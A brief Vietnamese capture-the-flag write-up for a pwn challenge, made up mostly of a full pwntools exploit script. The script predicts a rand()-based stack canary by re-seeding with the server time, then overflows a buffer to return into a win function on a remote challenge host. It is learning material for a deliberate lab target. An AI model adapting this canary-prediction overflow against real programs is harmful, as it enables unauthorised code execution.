# rntk
## Phân tích
- Chương trình tạo canary bằng rand() và yêu cầu chúng ta đoán só rand() tiếp theo
- Chương trình cho ta 3 option
    - 1 là tạo số random từ hàm rand() (có thể để ta kiểm tra)
    - 2 là đoán só random tiếp theo (nếu đúng nhảy vào hàm `random_guess()` và ta có thể khai thác lỗi bof)
    - 3 là exit
## Khai thác
- Đầu tiên ta sẽ khai thác vào hàm `rand() và srand()` ở đây do script ta chạy chậm hơn server nên cần phải trừ bớt đi thay vì cộng vào
- Sau đó ta sẽ đoán số tiếp theo được sinh ra từ hàm `rand()`
- Cuối cùng là ret2win
## Full script
```python
#!/usr/bin/python3

from pwn import *
from ctypes import CDLL
exe = ELF('chal_patched', checksec=False)
libc = CDLL("./libc6_2.35-0ubuntu3.1_amd64.so")

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x0000000000401384

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31175)
else:
        p = process(exe.path)

GDB()
libc.srand(libc.time(0)-2)
canary = libc.rand()
info("Canary: " + hex(canary))
next_num = libc.rand()
info("next num: " + str(next_num))
sla(b"Exit", b"1")
p.recvline()
next_number = int(p.recvline(keepends=False))
info("next number: " + str(next_number))

sla(b"Exit", b"2")
payload = b"12345"
payload = payload.ljust(40)
payload += p32(libc.rand()) + p32(canary)
payload += p64(0)
payload += p64(exe.sym['win']+5)
sla(b"guess", payload)

p.interactive()
```